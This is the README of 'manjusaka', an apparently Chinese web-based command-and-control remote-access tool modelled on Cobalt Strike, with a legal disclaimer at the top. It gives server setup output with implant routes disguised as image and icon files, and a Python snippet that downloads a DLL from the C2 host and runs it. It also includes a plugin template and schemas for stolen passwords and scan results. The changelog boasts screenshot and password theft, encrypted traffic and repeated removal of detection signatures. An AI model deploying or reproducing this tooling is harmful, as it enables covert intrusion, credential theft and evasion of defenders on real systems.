
# 免责声明 
本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。



# manjusaka
牛屎花  一款基于WEB界面的仿CobaltStrike C2远控 

##系统架构： ![](https://github.com/YDHCUI/manjusaka/blob/mainimages/1.jpg)

## 使用方法
```bash
[root@devops nps]# ./manjusaka
[NPS] 2022/09/14 15:57:21 初始用户: manjusaka  密码: ZbFCa2L2LRd5
[NPS] 2022/09/14 15:57:21 创建项目: 公共项目 没有归属的npc放在这个项目里面
[NPS] 2022/09/14 15:57:21 监听项目路由: VHOS5vqN
[NPS] 2022/09/14 15:57:21 NPS监听地址 :3200
[NPS] 2022/09/14 15:57:21 NPU后台地址 : manjusaka
[NPS] 2022/09/14 15:57:21 NPC监听地址 :801
[NPS] 2022/09/14 15:57:21 NPC交互路由 : /:target/favicon.ico
[NPS] 2022/09/14 15:57:21 NPC下载路由 : /:target/assert/:sys/bg.jpg
[NPS] 2022/09/14 15:57:21 NPC文件路由 : /images/:fid/logo.png
```
则NPS访问地址为  http://192.168.93.217:3200/manjusaka 


1、创建项目，默认有一个公共项目，选择当前项目后 可在回传结果里面查看当前项目回传的信息

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/1.jpg)


2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc
 
```python
import requests
from ctypes import cdll

res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/bg.jpg")
with open("a.dll","wb") as f:
    f.write(res.content)

dll = cdll.LoadLibrary("a.dll")
dll.main()

```


![](https://github.com/YDHCUI/manjusaka/blob/mainimages/2.png)

3、npc上线，点选中该npc即可对其进行操作

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/3.png)

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/4.png)

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/5.png)

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/6.png)

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/7.png)

![](https://github.com/YDHCUI/manjusaka/blob/mainimages/8.png)


4、插件系统 生成dll/so插件, 以plug_name_nps.dll格式命名放到plugins文件夹下面 即可动态调用
插件开发示例, main传入插件运行参数 传出返回的内容值 
```rust
/* 
//./Cargo.toml
[lib]
path = "src/lib.rs"
crate-type = ["cdylib"]
*/

//src/lib.rs

use std::ffi::CStr;
use std::ffi::CString;
use std::os::raw::c_char;

#[no_mangle]
pub unsafe extern "C" fn main(args: *const c_char) -> *const c_char { 
    let r_str = CStr::from_ptr(args).to_str().unwrap();

    println!("plugin load args: {}", r_str);
    let c_str = format!("plugin return {}",r_str);

    CString::new(c_str).expect("CString failed").into_raw()
}

```
返回值匹配到如下protobuf格式后后将结果写入数据库

```protobuf
syntax = "proto3";

message PassResult{
    string username = 1;
    string password = 2;
    string passtype = 3;
    string passfrom = 4;
}

message PassScan{
    string hosts = 1;
    string ports = 2;
    string args = 3;
    repeated PortResult result = 4;
}

message PortResult{
    string host = 1;
    string port = 2;
    string proto = 3;
    string version = 4;
}
message PortScan{
    string hosts = 1;
    string ports = 2;
    string args = 3;
    repeated PortResult result = 4;
}
message HttpResult{
    string proto = 1;
    string host = 2;
    string port = 3;
    string title = 4;
    string note = 5;
}
message HttpScan{
    string hosts = 1;
    string ports = 2;
    string args = 3;
    repeated PortResult result = 4;
}

```

 
## 更新

### v0.5
1、修复安全漏洞

2、开放NPC配置修改功能

3、上传文件流程优化

4、增加动态插件功能，可拓展更多功能 

5、去除特征、修复bug 


### v0.4
1、随机key 

2、去除特征、修复bug 

### v0.3
1、实现截屏、密码获取功能。(仅window) 

2、修复cmd界面不能黏贴的bug。 

3、修复项目不能暂停的bug。 

4、自动创建data文件夹。 


### v0.2
1、修改网络协议使流量加密。

2、加入本地文件上传下载功能。

3、修复shell界面位移bug。

### v0.1
1、实现基础远控功能。


## 交流
https://discord.gg/YMqeN5Qyk4
